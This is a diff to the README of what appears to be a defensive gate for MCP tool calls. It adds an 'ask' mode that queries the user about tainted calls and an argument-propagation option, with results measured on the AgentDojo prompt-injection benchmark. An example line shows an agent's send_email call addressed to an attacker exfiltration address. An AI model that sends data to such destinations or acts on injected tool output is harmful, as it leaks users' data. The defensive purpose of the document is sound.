@@ -236,7 +236,11 @@ What it cannot see: the user's message. MCP carries tool traffic, not the conver
 so "a value the user named is theirs" has nothing to consult here unless the host passes
 it (`--trust "…"` adds standing trusted context). The default mode is therefore `taint`
 (destination and content traced to earlier tool results); `--mode strict` also blocks any
-sensitive call once untrusted data is in scope, and will break ordinary tasks. Policies
+sensitive call once untrusted data is in scope, and will break ordinary tasks. `--mode ask`
+keeps the taint rules but, in a host that supports MCP elicitation, puts a tainted call to
+the user as a yes/no question with the evidence instead of blocking it; on AgentDojo that
+is about one question in every three tasks instead of one broken task in four (RESULTS.md).
+Hosts without elicitation get a block. Policies
 are drafted from names and schemas: a tool whose name does not say what it does is
 invisible to that, and the drafted table is printed at startup so you can see what was
 inferred.
@@ -265,6 +269,11 @@ session.authorize({"name": "send_email", "args": {"to": "exfil@attacker.tld"}}).
 Authorization does not launder a tainted destination: `authorized=True` clears
 co-presence, because the principal asked for the action. It does not clear an argument
 value that traces back to untrusted content, because the principal did not choose that.
+
+`GateSession(propagation="arguments")` narrows the inheritance rule so that a lookup with
+clean arguments yields a neutral result instead of an untrusted one. Measured on AgentDojo
+it recovers one task and lets nine looked-up destinations through, so the default stays
+`scope`; the numbers are in RESULTS.md.
 
 ### Wiring it into an existing agent
 
